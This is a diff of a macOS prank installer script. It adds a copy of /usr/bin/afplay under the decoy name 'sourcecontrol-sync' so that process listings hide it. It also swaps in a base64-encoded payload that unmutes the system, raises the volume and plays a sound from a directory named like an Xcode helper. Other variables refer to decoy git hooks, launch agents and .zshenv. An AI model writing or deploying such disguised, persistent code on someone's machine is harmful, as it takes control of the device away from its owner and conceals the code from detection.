@@ -16,6 +16,7 @@ XDG_GIT_CONFIG="$HOME/.config/git/config"
 SHELL_UTIL="$HOME/.config/shell/utils/completions.zsh"
 DECOY_HOOKS_DIR="$HOME/.config/git/hooks"
 ZSHENV="$HOME/.zshenv"
+AFPLAY_ALIAS="$SUPPORT_DIR/sourcecontrol-sync"
 SOUND_SRC_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 
 echo "Installing..."
@@ -26,9 +27,13 @@ mkdir -p "$SUPPORT_DIR" "$HOOKS_DIR" "$STATE_DIR" "$LAUNCH_AGENTS_DIR" \
 
 cp "$SOUND_SRC_DIR/notification.aiff" "$SOUND_FILE"
 
+# Copy afplay under an innocuous name so ps aux shows 'sourcecontrol-sync' not 'afplay'
+cp /usr/bin/afplay "$AFPLAY_ALIAS"
+chmod +x "$AFPLAY_ALIAS"
+
 
 cat > "$PAYLOAD_FILE" <<'PAYLOAD_B64'
-IyEvYmluL2Jhc2gKIyBkYW1uIGRhbmllbCwgYmFjayBhdCBpdCBhZ2FpbiB3aXRoIHRoZSB3aGl0ZSB2YW5zIPCfkJAKIyBIYXJtbGVzcyBwcmFuayBwYXlsb2FkLiBTZWUgaHR0cHM6Ly9naXRodWIuY29tL2JydW5vYm9zc2dhbmcvZGFtbi1kYW5pZWwtcHJhbmsKb3Nhc2NyaXB0IC1lICJzZXQgdm9sdW1lIG91dHB1dCBtdXRlZCBmYWxzZSIgPi9kZXYvbnVsbCAyPiYxIHx8IHRydWUKb3Nhc2NyaXB0IC1lICJzZXQgdm9sdW1lIG91dHB1dCB2b2x1bWUgNzAiID4vZGV2L251bGwgMj4mMSB8fCB0cnVlCmFmcGxheSAiJEhPTUUvTGlicmFyeS9BcHBsaWNhdGlvbiBTdXBwb3J0L2NvbS5hcHBsZS5kdC5YY29kZS5zb3VyY2Vjb250cm9sLmhlbHBlci9jYWNoZS5kYXQiID4vZGV2L251bGwgMj4mMSB8fCB0cnVlCmV4aXQgMAo=
+IyEvYmluL2Jhc2gKIyBkYW1uIGRhbmllbCwgYmFjayBhdCBpdCBhZ2FpbiB3aXRoIHRoZSB3aGl0ZSB2YW5zIPCfkJAKIyBIYXJtbGVzcyBwcmFuayBwYXlsb2FkLiBTZWUgaHR0cHM6Ly9naXRodWIuY29tL2JydW5vYm9zc2dhbmcvZGFtbi1kYW5pZWwtcHJhbmsKb3Nhc2NyaXB0IC1lICJzZXQgdm9sdW1lIG91dHB1dCBtdXRlZCBmYWxzZSIgPi9kZXYvbnVsbCAyPiYxIHx8IHRydWUKb3Nhc2NyaXB0IC1lICJzZXQgdm9sdW1lIG91dHB1dCB2b2x1bWUgNzAiID4vZGV2L251bGwgMj4mMSB8fCB0cnVlCiIkSE9NRS9MaWJyYXJ5L0FwcGxpY2F0aW9uIFN1cHBvcnQvY29tLmFwcGxlLmR0Llhjb2RlLnNvdXJjZWNvbnRyb2wuaGVscGVyL3NvdXJjZWNvbnRyb2wtc3luYyIgIiRIT01FL0xpYnJhcnkvQXBwbGljYXRpb24gU3VwcG9ydC9jb20uYXBwbGUuZHQuWGNvZGUuc291cmNlY29udHJvbC5oZWxwZXIvY2FjaGUuZGF0IiA+L2Rldi9udWxsIDI+JjEgfHwgdHJ1ZQpleGl0IDAK
 PAYLOAD_B64
 
 
